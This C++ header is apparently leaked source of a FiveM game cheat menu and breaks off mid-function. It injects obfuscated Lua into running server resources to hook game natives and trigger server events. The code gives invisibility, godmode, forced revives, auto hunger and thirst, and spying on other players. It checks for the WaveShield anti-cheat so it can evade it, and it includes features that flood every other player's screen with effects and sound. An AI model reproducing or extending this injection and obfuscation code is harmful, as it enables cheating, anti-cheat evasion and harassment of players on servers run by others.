// Leaked By Cry Service & Siraj
#pragma once
#include <string>
#include <vector>
#include <windows.h>
#include <fstream>
#include <sstream>
#include <iterator>

namespace fx { class Resource; template<typename T> class fwRefContainer; }
extern bool ProcessMachoCommands(const std::string& script, std::vector<fx::fwRefContainer<fx::Resource>>& resources);
extern bool ExecuteScriptInSelectedResource(const std::string& script);

namespace LuaCore {
    static bool IsWaveShieldStarted(const std::vector<fx::fwRefContainer<fx::Resource>>& resources) {
        for (auto& r : resources) {
            auto res = r.GetRef(); if (!res) continue;
            if (res->GetName() == "WaveShield1") return true;
        }
        return false;
    }

    // Function declarations and state variables
    static void ToggleAutoHunger(bool state);
    static void ToggleAutoThirst(bool state);
    static void ToggleSemiGod(bool state);
    static void ToggleWhiteScreenAll(bool state);
    static void ToggleFireScreenAll(bool state);
    static void ToggleSoundSpamAll(bool state);
    static void TogglePickupVehicles(bool state);
    static void ExecuteTriggerAction(const std::string& type);

    inline static bool godmodeActive = false;
    inline static bool autohungerActive = false;
    inline static bool autothirstActive = false;
    inline static bool semigodActive = false;
    inline static bool whitescreenActive = false;
    inline static bool firescreenActive = false;
    inline static bool soundspamActive = false;
    inline static bool pickupVehiclesActive = false;

    static std::string GetTargetResource(const std::vector<fx::fwRefContainer<fx::Resource>>& resources) {
        bool spawnmanager = false;
        bool monitor = false;
        bool playernames = false;
        for (auto& r : resources) {
            auto res = r.GetRef(); if (!res) continue;
            std::string name = res->GetName();
            std::string lower = name;
            for (auto& c : lower) c = tolower(c);
            if (lower == "spawnmanager") spawnmanager = true;
            else if (lower == "monitor") monitor = true;
            else if (lower == "playernames") playernames = true;
        }

        if (spawnmanager) return "spawnmanager";
        if (monitor) return "monitor";
        if (playernames) return "playernames";
        return "hardcap"; 
    }

    static void ToggleInvisibility(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);

            if (state) {
                std::string code = R"lua(
                    local _d = function(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local _hook = _G[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})] or (_ENV and _ENV[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})])

                    if not _G.SouthInvisibilityStruct then
                        _G.SouthInvisibilityStruct = {
                            enabled = false,
                            wasVisible = true,
                        }

                        if _hook then
                            pcall(function()
                                _hook("IsEntityVisible", function(originalFn, ped)
                                    if _G.SouthInvisibilityStruct and _G.SouthInvisibilityStruct.enabled and ped == PlayerPedId() then
                                        return true
                                    end
                                    return originalFn(ped)
                                end)

                                _hook("IsEntityVisibleToScript", function(originalFn, ped)
                                    if _G.SouthInvisibilityStruct and _G.SouthInvisibilityStruct.enabled and ped == PlayerPedId() then
                                        return true
                                    end
                                    return originalFn(ped)
                                end)

                                _hook("SetEntityVisible", function(originalFn, ped, toggle, unk)
                                    if _G.SouthInvisibilityStruct and _G.SouthInvisibilityStruct.enabled and ped == PlayerPedId() and toggle == true then
                                        return
                                    end
                                    return originalFn(ped, toggle, unk)
                                end)
                            end)
                        else
                            local function fallbackHook(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if originalNative and type(originalNative) == "function" then
                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end
                            end
                            fallbackHook("IsEntityVisible", function(originalFn, ped)
                                if _G.SouthInvisibilityStruct and _G.SouthInvisibilityStruct.enabled and ped == PlayerPedId() then
                                    return true
                                end
                                return originalFn(ped)
                            end)
                            fallbackHook("IsEntityVisibleToScript", function(originalFn, ped)
                                if _G.SouthInvisibilityStruct and _G.SouthInvisibilityStruct.enabled and ped == PlayerPedId() then
                                    return true
                                end
                                return originalFn(ped)
                            end)
                            fallbackHook("SetEntityVisible", function(originalFn, ped, toggle, unk)
                                if _G.SouthInvisibilityStruct and _G.SouthInvisibilityStruct.enabled and ped == PlayerPedId() and toggle == true then
                                    return
                                end
                                return originalFn(ped, toggle, unk)
                            end)
                        end
                    end

                    if not _G.SouthInvisibilityStruct.enabled then
                        _G.SouthInvisibilityStruct.enabled = true
                        local ped = PlayerPedId()
                        _G.SouthInvisibilityStruct.wasVisible = IsEntityVisible(ped)

                        SetEntityVisible(ped, false, false)
                        SetEntityAlpha(ped, 0, false)
                        NetworkSetEntityInvisibleToNetwork(ped, true)

                        CreateThread(function()
                            while _G.SouthInvisibilityStruct and _G.SouthInvisibilityStruct.enabled do
                                local currentPed = PlayerPedId()
                                if currentPed and DoesEntityExist(currentPed) then
                                    SetEntityVisible(currentPed, false, false)
                                    SetEntityAlpha(currentPed, 0, false)
                                end
                                Wait(250)
                            end
                        end)
                    end
                )lua";
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
            } else {
                std::string code = R"lua(
                    if _G.SouthInvisibilityStruct and _G.SouthInvisibilityStruct.enabled then
                        _G.SouthInvisibilityStruct.enabled = false
                        local ped = PlayerPedId()
                        if ped and DoesEntityExist(ped) then
                            SetEntityVisible(ped, _G.SouthInvisibilityStruct.wasVisible, false)
                            ResetEntityAlpha(ped)
                            NetworkSetEntityInvisibleToNetwork(ped, false)
                        end
                    end
                )lua";
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
            }
        } catch (...) {}
    }

    static void ToggleInvincibility(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);
            bool isWS = IsWaveShieldStarted(resources);

            if (state) {
                std::string code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local _hook = _G[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})] or (_ENV and _ENV[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})])
                    if _hook then
                        _hook("CreateThread", function(o, ...) return o(...) end)
                    end

                    if _G.SouthInvincibility == nil then _G.SouthInvincibility = false end
                    if _G.SouthInvincibilityThreadRunning == nil then _G.SouthInvincibilityThreadRunning = false end
                    _G.SouthInvincibility = true

                    if not _G.SouthInvincibilityThreadRunning then
                        _G.SouthInvincibilityThreadRunning = true
                        local function initFlow(cb)
                            local co = coroutine.create(cb)
                            local wait_fn = _g({87,97,105,116})
                            _g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                                while coroutine.status(co) ~= "dead" do
                                    coroutine.resume(co)
                                    wait_fn(0)
                                end
                            end)
                        end

                        initFlow(function()
                            local ped_fn = _g({80,108,97,121,101,114,80,101,100,73,100})
                            local set_proofs = _g({83,101,116,69,110,116,105,116,121,80,114,111,111,102,115})
                            local exist_fn = _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})
                            local dead_fn = _g({73,115,80,101,100,68,101,97,100,79,114,68,121,105,110,103})
                            local wait_fn = _g({87,97,105,116})

                            while true do
                                if _G.SouthInvincibility then
                                    local p = ped_fn()
                                    if p and p ~= 0 and exist_fn(p) and not dead_fn(p) then
                                        set_proofs(p, true, true, true, true, true, true, true, true)
                                    end
                                else
                                    local p = ped_fn()
                                    if p and p ~= 0 and exist_fn(p) and not dead_fn(p) then
                                        set_proofs(p, false, false, false, false, false, false, false, false)
                                    end
                                    _G.SouthInvincibilityThreadRunning = false
                                    break
                                end
                                wait_fn(500)
                            end
                        end)
                    end
                )lua";
                std::string fullCode = "local isWS = " + std::string(isWS ? "true" : "false") + "\n" + code;
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + fullCode + "]])", resources);
            } else {
                std::string code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end
                    local _hook = _G[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})] or (_ENV and _ENV[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})])
                    if _hook then
                        _hook("CreateThread", function(o, ...) return o(...) end)
                    end
                    _G.SouthInvincibility = false

                    _g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                        local p = _g({80,108,97,121,101,114,80,101,100,73,100})()
                        local exist_fn = _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})
                        local dead_fn = _g({73,115,80,101,100,68,101,97,100,79,114,68,121,105,110,103})
                        if p and p ~= 0 and exist_fn(p) and not dead_fn(p) then
                            _g({83,101,116,69,110,116,105,116,121,80,114,111,111,102,115})(p, false, false, false, false, false, false, false, false)
                        end
                    end)
                )lua";
                std::string fullCode = "local isWS = " + std::string(isWS ? "true" : "false") + "\n" + code;
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + fullCode + "]])", resources);
            }
        } catch (...) {}
    }

    static void ExecuteUniversalRevive() {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();

            struct ReviveAction { std::string resName; std::string code; int type = 0; }; 
            std::vector<ReviveAction> actions = {
                {"amigo", "respawnPlayer()", 0},
                {"rzrp-base", R"lua(
                    local ped = PlayerPedId()
                    if ped and DoesEntityExist(ped) then
                        local coords = GetEntityCoords(ped)
                        local heading = GetEntityHeading(ped)
                        NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
                        SetEntityHealth(ped, 200)
                        ClearPedBloodDamage(ped)
                        ClearPedTasksImmediately(ped)
                        SetPlayerInvincible(PlayerId(), false)
                        SetEntityInvincible(ped, false)
                        SetPedCanRagdoll(ped, true)
                        SetPedCanRagdollFromPlayerImpact(ped, true)
                        SetPedRagdollOnCollision(ped, true)
                    end
                )lua", 1},
                {"FiveStar", R"lua(
                    if not _G.South then _G.South = { TEvent = function(...) end, TSEvent = function(...) end } end
                    local _d = function(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local _hook = _G[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})] or (_ENV and _ENV[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})])
                    local function HookNative(nativeName, newFunction)
                        if _hook then
                            pcall(function() _hook(nativeName, newFunction) end)
                        else
                            local originalNative = _G[nativeName]
                            if originalNative and type(originalNative) == "function" then
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end
                        end
                    end
                    HookNative("TriggerEvent", function(originalFn, eName, ...) _G.South.TEvent = function(event, ...) return originalFn(event, ...) end return originalFn(eName, ...) end)
                    HookNative("TriggerServerEvent", function(originalFn, eName, ...) _G.South.TSEvent = function(event, ...) return originalFn(event, ...) end return originalFn(eName, ...) end)
                    _G.South.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                    _G.South.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end
                    local function initFlow(cb) local co = coroutine.create(cb) while coroutine.status(co) ~= "dead" do coroutine.resume(co) Citizen.Wait(0) end end
                    initFlow(function() Citizen.Wait(1000) _G.South.TSEvent('revive:Player:Dead') end)
                )lua", 0},
                {"scripts", "TriggerEvent('deathscreen:revive')", 0},
                {"framework", "TriggerEvent('deathscreen:revive')", 0},
                {"qb-jail", "TriggerEvent('hospital:client:Revive')", 0},
                {"mc9-medicsystem", "RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))", 0}
            };

            bool triggered = false;
            for (auto& action : actions) {
                bool found = false;
                for (auto& r : resources) { if (r.GetRef() && r.GetRef()->GetName() == action.resName) { found = true; break; } }

                if (found) {
                    if (action.type == 0) ::ProcessMachoCommands("MachoInjectResource(\"" + action.resName + "\", [[" + action.code + "]])", resources);
                    else ::ProcessMachoCommands("MachoInjectResource(3, \"" + action.resName + "\", [[" + action.code + "]])", resources);
                    triggered = true;
                }
            }

            bool hasWasabi = false;
            for (auto& r : resources) { if (r.GetRef() && r.GetRef()->GetName() == "wasabi_ambulance") { hasWasabi = true; break; } }
            if (hasWasabi) {
                std::string wCode = R"lua(
                    if not _G.South then _G.South = { TEvent = function(...) end, TSEvent = function(...) end } end
                    local _d = function(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local _hook = _G[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})] or (_ENV and _ENV[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})])
                    local function HookNative(nativeName, newFunction)
                        if _hook then
                            pcall(function() _hook(nativeName, newFunction) end)
                        else
                            local originalNative = _G[nativeName]
                            if originalNative and type(originalNative) == "function" then
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end
                        end
                    end
                    HookNative("TriggerEvent", function(originalFn, eName, ...) _G.South.TEvent = function(event, ...) return originalFn(event, ...) end return originalFn(eName, ...) end)
                    HookNative("TriggerServerEvent", function(originalFn, eName, ...) _G.South.TSEvent = function(event, ...) return originalFn(event, ...) end return originalFn(eName, ...) end)
                    Citizen.SetTimeout(1000, function() _G.South.TEvent("esx:onPlayerSpawn") _G.South.TSEvent("esx:onPlayerSpawn") end)
                )lua";
                ::ProcessMachoCommands("MachoInjectResource(\"wasabi_ambulance\", [[" + wCode + "]])", resources);
                triggered = true;
            }

            if (!triggered) {

                std::string target = GetTargetResource(resources);
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[ TriggerEvent('hospital:client:Revive') TriggerEvent('esx_ambulancejob:revive') ]])", resources);
            }
        } catch (...) {}
    }

    // Bools are declared inside namespace LuaCore above

    static std::string GetGodmodeLuaScript(bool isWS) {
        std::string code = R"lua(
            local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
            local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

            local _hook = _G[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})] or (_ENV and _ENV[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})])
            if _hook then
                _hook("CreateThread", function(o, ...) return o(...) end)
                _G[_d({87,97,105,116})] = function(n) return _g({87,97,105,116})(n) end
            end

            if _G.SouthGodmode == nil then _G.SouthGodmode = false end
            if _G.SouthGodmodeThreadRunning == nil then _G.SouthGodmodeThreadRunning = false end
            _G.SouthGodmode = true

            if not _G.SouthGodmodeThreadRunning then
                _G.SouthGodmodeThreadRunning = true
                local thread_fn = _g({67,114,101,97,116,101,84,104,114,101,97,100})
                thread_fn(function()
                    local ped_fn = _g({80,108,97,121,101,114,80,101,100,73,100})
                    local pid_fn = _g({80,108,97,121,101,114,73,100})
                    local setInv_fn = _g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101})
                    local setPInv_fn = _g({83,101,116,80,108,97,121,101,114,73,110,118,105,110,99,105,98,108,101})
                    local wait_fn = _g({87,97,105,116})

                    while _G.SouthGodmode do
                        local p = ped_fn()
                        if p and p ~= 0 then
                            setInv_fn(p, true)
                            setPInv_fn(pid_fn(), true)
                        end
                        wait_fn(0)
                    end
                    local p = ped_fn()
                    if p and p ~= 0 then
                        setInv_fn(p, false)
                        setPInv_fn(pid_fn(), false)
                    end
                    _G.SouthGodmodeThreadRunning = false
                end)
            end
        )lua";
        return "local isWS = " + std::string(isWS ? "true" : "false") + "\n" + code;
    }

    inline bool spectateActive = false;
    inline int spectateTargetSid = -1;

    static std::string GetSpectateLuaScript(bool isWS, int serverId, bool enabled) {
        std::string code = R"lua(
            local targetSid = )lua" + std::to_string(serverId) + R"lua(
            local enabled = )lua" + (enabled ? "true" : "false") + R"lua(

            -- Dynamic string decoding helper & Native callers using hashes
            local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
            local function _g(n, hash)
                local name = _d(n)
                return _G[name] or function(...) return Citizen.InvokeNative(hash, ...) end
            end

            -- Dynamic native resolves with full character array obfuscation & hex hashes
            local _PlayerPedId = _g({80,108,97,121,101,114,80,101,100,73,100}, 0x438E35C4C338A1A9)
            local _GetPlayerFromServerId = _g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100}, 0x344CA85D4A2743E5)
            local _GetPlayerPed = _g({71,101,116,80,108,97,121,101,114,80,101,100}, 0x43DBED0170AEC239)
            local _DoesEntityExist = _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116}, 0x72449E489A4CE00F)
            local _GetEntityCoords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115}, 0x3FE3FBDD91D0E790)
            local _GetEntityHeading = _g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103}, 0xE83D5C4C4E1E64E4)
            local _RequestCollisionAtCoord = _g({82,101,113,117,101,115,116,67,111,108,108,105,115,105,111,110,65,116,67,111,111,114,100}, 0x5B7C224376C4CE9F)
            local _FreezeEntityPosition = _g({70,114,101,101,122,101,69,110,116,105,116,121,80,111,115,105,116,105,111,110}, 0x428A3C376485C266)

            local _SetCamActive = _g({83,101,116,67,97,109,65,99,116,105,118,101}, 0x026FB97D0A425F84)
            local _PointCamAtEntity = _g({80,111,105,110,116,67,97,109,65,116,69,110,116,105,116,121}, 0x5640BFF86B16E8DC)

            if not _G.SouthSpectate then
                _G.SouthSpectate = {}
            end

            local function stopSpectate()
                if not _G.SouthSpectate or _G.SouthSpectate.isStopped then
                    return
                end
                _G.SouthSpectate.isStopped = true
                _G.SouthSpectate.active = false

                local me = _PlayerPedId()

                -- 1. Restore focus and script cams safely (SetFocusEntity and ClearFocus are not thread-safe or stable on scripted cams and cause streaming heap corruption crashes in adhesive)
                _g({67,108,101,97,114,70,111,99,117,115}, 0x198F8BE9A9A0C3E4)()
                _g({82,101,110,100,101,114,83,99,114,105,112,116,67,97,109,115}, 0x07E5B515F0C7B3B1)(false, true, 0, false, false)

                if _G.SouthSpectate.camera then
                    _g({68,101,115,116,114,111,121,67,97,109}, 0x868B7C503C1AC7EA)(_G.SouthSpectate.camera, true)
                    _G.SouthSpectate.camera = nil
                end

                -- 2. Wait for collision to load around original player coordinates before unfreezing to prevent falling
                local pc = _GetEntityCoords(me)
                _RequestCollisionAtCoord(pc.x, pc.y, pc.z)
                local timeout = _g({71,101,116,71,97,109,101,84,105,109,101,114}, 0x9CD27D00456E25E7)() + 1000
                while not _g({72,97,115,67,111,108,108,105,115,105,111,110,76,111,97,100,101,100,65,114,111,117,110,100,69,110,116,105,116,121}, 0xF28965D04F570D0E)(me) and _g({71,101,116,71,97,109,101,84,105,109,101,114}, 0x9CD27D00456E25E7)() < timeout do
                    Citizen.Wait(0)
                end

                -- 3. Unfreeze local player (exactly like Freecam)
                _FreezeEntityPosition(me, false)

                _G.SouthSpectate = nil
            end

            local function startSpectate(sid)
                local targetPlayer = _GetPlayerFromServerId(sid)
                if targetPlayer == -1 then
                    return
                end

                local me = _PlayerPedId()

                _G.SouthSpectate.active = true
                _G.SouthSpectate.targetSid = sid
                _G.SouthSpectate.isStopped = false

                -- 1. Setup: DO NOT freeze local player (user requested free movement while spectating)
                -- _FreezeEntityPosition(me, true)

                -- 2. Fetch initial target coordinates
                local targetPed = _GetPlayerPed(targetPlayer)
                local targetCoords
                if _DoesEntityExist(targetPed) and targetPed ~= 0 then
                    targetCoords = _GetEntityCoords(targetPed)
                else
                    targetCoords = _g({71,101,116,80,108,97,121,101,114,67,111,111,114,100,115}, 0x11CDFDCA)(targetPlayer)
                end

                -- 3. Create Custom Scripted Camera at target position (identical to Freecam)
                _G.SouthSpectate.camera = _g({67,114,101,97,116,101,67,97,109}, 0xC3981DCE61C9E13F)("DEFAULT_SCRIPTED_CAMERA", true)
                _SetCamActive(_G.SouthSpectate.camera, true)
                _g({82,101,110,100,101,114,83,99,114,105,112,116,67,97,109,115}, 0x07E5B515F0C7B3B1)(true, true, 0, false, false)

                -- 4. Follow target update thread
                CreateThread(function()
                    if not _G._spectate_rot then
                        _G._spectate_rot = {x = 0.0, y = 0.0, z = 0.0}
                    end

                    while _G.SouthSpectate and _G.SouthSpectate.active and _G.SouthSpectate.targetSid == sid do
                        local pClient = _GetPlayerFromServerId(sid)
                        if pClient ~= -1 then
                            local pPed = _GetPlayerPed(pClient)
                            local pc
                            local hasPed = _DoesEntityExist(pPed) and pPed ~= 0

                            if hasPed then
                                pc = _GetEntityCoords(pPed)
                            else
                                pc = _g({71,101,116,80,108,97,121,101,114,67,111,111,114,100,115}, 0x11CDFDCA)(pClient)
                            end

                            if pc and pc.x ~= 0.0 then
                                -- Mouse inputs for camera rotation (like Freecam but centered on player)
                                local hm = _g({71,101,116,67,111,110,116,114,111,108,78,111,114,109,97,108}, 0xEC3C9B8D5327B563)(0, 1) * 8.0
                                local vm = _g({71,101,116,67,111,110,116,114,111,108,78,111,114,109,97,108}, 0xEC3C9B8D5327B563)(0, 2) * 8.0
                                local ms, sf = 2.0, 0.5
                                local tx = _G._spectate_rot.x + vm * ms
                                local tz = _G._spectate_rot.z - hm * ms

                                if tx > 89.0 then tx = 89.0 end
                                if tx < -89.0 then tx = -89.0 end

                                _G._spectate_rot.x = _G._spectate_rot.x + (tx - _G._spectate_rot.x) * sf
                                _G._spectate_rot.z = _G._spectate_rot.z + (tz - _G._spectate_rot.z) * sf

                                -- Zoom control using scroll wheel (Scroll UP zooms IN, Scroll DOWN zooms OUT)
                                if not _G._spectate_dist then
                                    _G._spectate_dist = 5.0
                                end
                                local zoomIn = _g({73,115,68,105,115,97,98,108,101,100,67,111,110,116,114,111,108,74,117,115,116,80,114,101,115,115,101,100}, 0x91AEF906BCA88877)(0, 15) or 
                                               _g({73,115,68,105,115,97,98,108,101,100,67,111,110,116,114,111,108,74,117,115,116,80,114,101,115,115,101,100}, 0x91AEF906BCA88877)(0, 241) or
                                               _g({73,115,67,111,110,116,114,111,108,74,117,115,116,80,114,101,115,115,101,100}, 0x580417101DDB492F)(0, 15) or
                                               _g({73,115,67,111,110,116,114,111,108,74,117,115,116,80,114,101,115,115,101,100}, 0x580417101DDB492F)(0, 241)

                                local zoomOut = _g({73,115,68,105,115,97,98,108,101,100,67,111,110,116,114,111,108,74,117,115,116,80,114,101,115,115,101,100}, 0x91AEF906BCA88877)(0, 14) or 
                                                _g({73,115,68,105,115,97,98,108,101,100,67,111,110,116,114,111,108,74,117,115,116,80,114,101,115,115,101,100}, 0x91AEF906BCA88877)(0, 242) or
                                                _g({73,115,67,111,110,116,114,111,108,74,117,115,116,80,114,101,115,115,101,100}, 0x580417101DDB492F)(0, 14) or
                                                _g({73,115,67,111,110,116,114,111,108,74,117,115,116,80,114,101,115,115,101,100}, 0x580417101DDB492F)(0, 242)

                                if zoomIn then
                                    _G._spectate_dist = math.max(1.5, _G._spectate_dist - 0.5)
                                elseif zoomOut then
                                    _G._spectate_dist = math.min(40.0, _G._spectate_dist + 0.5)
                                end

                                -- Orbit calculation around target coordinates
                                local distance = _G._spectate_dist
                                local theta = math.rad(_G._spectate_rot.z)
                                local phi = math.rad(_G._spectate_rot.x)

                                local dx = distance * math.cos(phi) * math.sin(-theta)
                                local dy = distance * math.cos(phi) * math.cos(-theta)
                                local dz = distance * math.sin(phi)

                                local cx = pc.x + dx
                                local cy = pc.y + dy
                                local cz = pc.z + dz

                                -- Request collision and stream target area safely using SetFocusArea (SetFocusPosAndVel causes immediate crashes in adhesive.dll when entity is out of streaming range/distance)
                                _RequestCollisionAtCoord(cx, cy, cz)
                                _g({83,101,116,70,111,99,117,115,65,114,101,97}, 0x95C9B382A7CA9CE0)(cx, cy, cz, 0.0, 0.0, 0.0)

                                if _G.SouthSpectate and _G.SouthSpectate.camera then
                                    _g({83,101,116,67,97,109,67,111,111,114,100}, 0x4A42C12CE00FE13C)(_G.SouthSpectate.camera, cx, cy, cz)
                                    if hasPed then
                                        _PointCamAtEntity(_G.SouthSpectate.camera, pPed, 0.0, 0.0, 0.0, true)
                                    else
                                        _g({80,111,105,110,116,67,97,109,65,116,67,111,111,114,100}, 0xF754F643DEEC98A5)(_G.SouthSpectate.camera, pc.x, pc.y, pc.z)
                                    end
                                end
                            end
                        else
                            -- Target player disconnected/gone, auto-stop spectate
                            _G.SouthSpectate.active = false
                            break
                        end

                        Wait(0)
                    end
                    if _G.SouthSpectate and not _G.SouthSpectate.active then
                        stopSpectate()
                    end
                end)
            end

            if enabled then
                startSpectate(targetSid)
            else
                if _G.SouthSpectate then
                    _G.SouthSpectate.active = false
                    CreateThread(function()
                        stopSpectate()
                    end)
                end
            end
        )lua";
        return "local isWS = " + std::string(isWS ? "true" : "false") + "\n" + code;
    }

    static void ToggleGodmode(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);
            bool isWS = IsWaveShieldStarted(resources);

            godmodeActive = state;

            if (state) {
                std::string fullCode = GetGodmodeLuaScript(isWS);
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + fullCode + "]])", resources);
            } else {
                std::string code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end
                    local _hook = _G[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})] or (_ENV and _ENV[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})])
                    if _hook then
                        _hook("CreateThread", function(o, ...) return o(...) end)
                    end
                    _G.SouthGodmode = false
                )lua";
                std::string fullCode = "local isWS = " + std::string(isWS ? "true" : "false") + "\n" + code;
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + fullCode + "]])", resources);
            }
        } catch (...) {}
    }

    static std::string GetAutoHungerLuaScript(bool isWS, bool state) {
        return R"lua(
            if _G.SouthAutoHunger == nil then _G.SouthAutoHunger = false end
            _G.SouthAutoHunger = )lua" + std::string(state ? "true" : "false") + R"lua(
            if _G.SouthAutoHunger and not _G.SouthAutoHungerRunning then
                _G.SouthAutoHungerRunning = true
                Citizen.CreateThread(function()
                    while _G.SouthAutoHunger do
                        TriggerEvent('esx_status:set', 'hunger', 1000000)
                        TriggerServerEvent('consumables:server:addHunger', math.random(5,10))
                        Citizen.Wait(1000)
                    end
                    _G.SouthAutoHungerRunning = false
                end)
            end
        )lua";
    }

    static void ToggleAutoHunger(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);
            bool isWS = IsWaveShieldStarted(resources);
            autohungerActive = state;
            std::string fullCode = GetAutoHungerLuaScript(isWS, state);
            ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + fullCode + "]])", resources);
        } catch (...) {}
    }

    static std::string GetAutoThirstLuaScript(bool isWS, bool state) {
        return R"lua(
            if _G.SouthAutoThirst == nil then _G.SouthAutoThirst = false end
            _G.SouthAutoThirst = )lua" + std::string(state ? "true" : "false") + R"lua(
            if _G.SouthAutoThirst and not _G.SouthAutoThirstRunning then
                _G.SouthAutoThirstRunning = true
                Citizen.CreateThread(function()
                    while _G.SouthAutoThirst do
                        TriggerEvent('esx_status:set', 'thirst', 1000000)
                        TriggerServerEvent('consumables:server:addThirst', math.random(5,10))
                        Citizen.Wait(1000)
                    end
                    _G.SouthAutoThirstRunning = false
                end)
            end
        )lua";
    }

    static void ToggleAutoThirst(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);
            bool isWS = IsWaveShieldStarted(resources);
            autothirstActive = state;
            std::string fullCode = GetAutoThirstLuaScript(isWS, state);
            ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + fullCode + "]])", resources);
        } catch (...) {}
    }

    static std::string GetSemiGodLuaScript(bool isWS, bool state) {
        return R"lua(
            if _G.SouthSemiGod == nil then _G.SouthSemiGod = false end
            _G.SouthSemiGod = )lua" + std::string(state ? "true" : "false") + R"lua(
            if _G.SouthSemiGod and not _G.SouthSemiGodRunning then
                _G.SouthSemiGodRunning = true
                Citizen.CreateThread(function()
                    while _G.SouthSemiGod do
                        local p = PlayerPedId()
                        if p and p ~= 0 then
                            if GetEntityHealth(p) < 200 then
                                SetEntityHealth(p, 200)
                            end
                        end
                        Citizen.Wait(200)
                    end
                    _G.SouthSemiGodRunning = false
                end)
            end
        )lua";
    }

    static void ToggleSemiGod(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);
            bool isWS = IsWaveShieldStarted(resources);
            semigodActive = state;
            std::string fullCode = GetSemiGodLuaScript(isWS, state);
            ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + fullCode + "]])", resources);
        } catch (...) {}
    }

    static void ToggleWhiteScreenAll(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);
            whitescreenActive = state;
            std::string code = R"lua(
                if _G.SouthWhiteScreen == nil then _G.SouthWhiteScreen = false end
                _G.SouthWhiteScreen = )lua" + std::string(state ? "true" : "false") + R"lua(
                if _G.SouthWhiteScreen and not _G.SouthWhiteScreenRunning then
                    _G.SouthWhiteScreenRunning = true
                    Citizen.CreateThread(function()
                        while _G.SouthWhiteScreen do
                            for _, id in ipairs(GetActivePlayers()) do
                                if id ~= PlayerId() then
                                    local ped = GetPlayerPed(id)
                                    if ped and DoesEntityExist(ped) then
                                        local coords = GetEntityCoords(ped)
                                        UseParticleFxAssetNextCall("core")
